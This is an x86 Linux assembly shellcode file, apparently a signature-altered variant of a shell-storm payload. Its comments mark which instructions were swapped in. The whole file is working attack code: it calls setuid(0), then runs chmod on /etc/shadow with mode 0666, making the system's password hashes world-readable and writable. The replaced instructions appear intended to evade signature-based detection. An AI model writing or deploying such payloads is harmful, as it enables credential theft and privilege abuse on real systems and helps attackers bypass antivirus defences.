	; http://shell-storm.org/shellcode/files/shellcode-608.php
	; Title: linux/x86 setuid(0) + chmod("/etc/shadow", 0666) Shellcode 37 Bytes
	; length - 40 bytes
	section .text

global _start

_start:
	sub ebx, ebx	; replaced
	push 0x17	; replaced
	pop eax		; replaced
	int 0x80
	sub eax, eax	; replaced
	push eax	; on success zero
	push 0x776f6461
        push 0x68732f63
        push 0x74652f2f
	mov ebx, esp
	mov cl, 0xb6	; replaced
	mov ch, 0x1	; replaced
        add al, 15	; replaced
        int 0x80
        add eax, 1	; replaced
        int 0x80

